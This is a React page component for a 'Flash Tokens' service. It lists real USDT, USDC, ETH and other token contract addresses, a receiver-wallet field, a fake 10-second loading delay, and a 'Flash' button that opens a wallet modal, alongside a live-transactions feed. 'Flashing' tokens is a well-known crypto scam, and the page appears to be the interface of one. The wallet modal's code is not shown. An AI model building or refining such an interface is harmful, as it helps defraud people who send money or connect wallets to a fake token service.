import { useState, useEffect } from 'react';
import Layout from '../components/Layout';
import Loading from '../components/Loading';
import WalletModal from '../components/WalletModal';
import LiveTransactions from '../components/LiveTransactions';

const TOKEN_OPTIONS = [
  { label: 'USDT (TRC20)', value: 'USDT_TRC20', network: 'TRON', contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
  { label: 'USDT (BEP20)', value: 'USDT_BEP20', network: 'BSC', contractAddress: '0x55d398326f99059fF775485246999027B3197955' },
  { label: 'USDT (ERC20)', value: 'USDT_ERC20', network: 'Ethereum', contractAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
  { label: 'Bitcoin (BEP20)', value: 'BTC_BEP20', network: 'BSC', contractAddress: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
  { label: 'USDC (BEP20)', value: 'USDC_BEP20', network: 'BSC', contractAddress: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
  { label: 'ETH (BEP20)', value: 'ETH_BEP20', network: 'BSC', contractAddress: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
  { label: 'SHIB (BEP20)', value: 'SHIB_BEP20', network: 'BSC', contractAddress: '0x2859e4544C4BB03966803b044A93563Bd2D0DD4D' },
];

export default function Flash() {
  const [isLoading, setIsLoading] = useState(true);
  const [receiverAddress, setReceiverAddress] = useState('');
  const [selectedToken, setSelectedToken] = useState(TOKEN_OPTIONS[0].value);
  const [isModalOpen, setIsModalOpen] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => setIsLoading(false), 10000);
    return () => clearTimeout(timer);
  }, []);

  if (isLoading) return <Loading />;

  return (
    <Layout>
      <div className="p-6 max-w-2xl mx-auto">
        <h1 className="text-2xl font-bold mb-4">Flash Tokens</h1>
        <input
          type="text"
          placeholder="Receiver Wallet"
          value={receiverAddress}
          onChange={(e) => setReceiverAddress(e.target.value)}
          className="w-full bg-gray-700 border-gray-600 text-white p-2 mb-4 rounded"
        />
        <select
          value={selectedToken}
          onChange={(e) => setSelectedToken(e.target.value)}
          className="w-full bg-gray-700 border-gray-600 text-white p-2 mb-4 rounded"
        >
          {TOKEN_OPTIONS.map((option) => (
            <option key={option.value} value={option.value}>
              {option.label}
            </option>
          ))}
        </select>
        <button
          onClick={() => setIsModalOpen(true)}
          className="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-4 rounded"
        >
          Flash
        </button>
        <WalletModal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
        <LiveTransactions token={selectedToken} />
      </div>
    </Layout>
  );
}